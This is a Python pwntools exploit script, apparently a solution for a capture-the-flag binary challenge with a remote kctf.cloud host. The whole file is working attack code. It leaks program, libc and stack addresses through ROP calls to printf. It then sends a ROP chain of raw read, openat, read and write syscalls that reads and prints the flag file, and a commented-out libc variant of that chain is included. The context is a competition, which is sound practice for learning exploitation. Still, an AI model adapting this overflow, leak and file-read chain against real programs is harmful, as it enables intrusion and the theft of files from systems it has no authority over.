#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF('./libc-2.31.so', checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'drywall.kctf-453514-codelab.kctf.cloud', 1337

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    break *main+471
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/chroot/home/user/chal"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='chal')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
#     Arch:       amd64-64-little
#     RELRO:      Full RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     Stripped:   No

def exploit():
    global io
    io = initialize()
    with log.progress("Leaking addresses"), context.silent:
        io.sendlineafter("What is your name, epic H4x0r?", b"anythin")
        io.recvuntil("0x")

        # Leaking main
        main = int(io.recvline().strip(), 16)
        elf.address = main - elf.sym['main']
        offset = 280

        # Leaking libc
        rop = ROP(elf)
        rop.raw(rop.ret.address)
        rop.printf(elf.got['printf'])
        rop.raw(rop.ret.address)
        rop.main()
        payload = flat({offset:[rop.chain()]})
        io.sendline(payload)
        printf = u64(io.recv(6).ljust(8, b'\x00'))
        libc.address = printf - libc.sym['printf']

        #Leaking stack
        rop = ROP(elf)
        rop.raw(rop.ret.address)
        rop.printf(libc.sym['environ'])
        rop.raw(rop.ret.address)
        rop.main()
        io.sendlineafter("What is your name, epic H4x0r?", b"anythin")
        io.sendline(flat({offset:[rop.chain()]}))
        io.recvline()
        io.recvline()
        io.recvline()
        io.recvline()
        stack = u64(io.recv(6).ljust(8, b'\x00'))
    log.info("Main: %#x", main)
    log.info("Elf base: %#x", elf.address)
    log.info("Printf: %#x", printf)
    log.info("Libc base: %#x", libc.address)
    log.info("Stack: %#x", stack)
    with log.progress("Doing ORW"), context.silent:
        mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
        xor_r10_r10 = next(libc.search(asm("xor r10d, r10d ; mov eax, r10d ; ret")))
        syscall = rop.find_gadget(['syscall', 'ret'])[0]
        print(hex(syscall))
        flag = "/home/user/flag.txt\x00"

        #Via Elf
        rop = ROP(elf)
        rop.raw(rop.ret.address)
        #Read filename
        rop.rax = constants.SYS_read
        rop.call(syscall, [0, elf.bss(), len(flag) + 1])

        #OpenAt
        rop.rax = constants.SYS_openat
        rop.call(syscall, [-100, elf.bss(), 0])
        rop.raw(mov_rdi_rax)
        #Read
        rop.rax = constants.SYS_read
        rop(rsi=elf.bss(), rdx=0x60)
        rop.raw(syscall)
        #Write
        rop.rax = constants.SYS_write
        rop.call(syscall, [1])

        # Via Libc
        # rop = ROP(libc)
        # rop.raw(rop.ret.address)
        # rop.read(0, elf.bss(), len(flag))
        # rop.open(flag_addr, 0)
        # rop.rcx = -1
        # rop.raw(mov_rdi_rax)
        # rop(rsi=elf.bss(), rdx=0x20)
        # rop.read()
        # rop.write(1)
        io.sendlineafter("What is your name, epic H4x0r?", "anythin")
        io.sendline(flat({offset:[rop.chain()]}))
        sleep(0.1)
        io.sendline(flag)

    io.interactive()

if __name__ == '__main__':
    exploit()
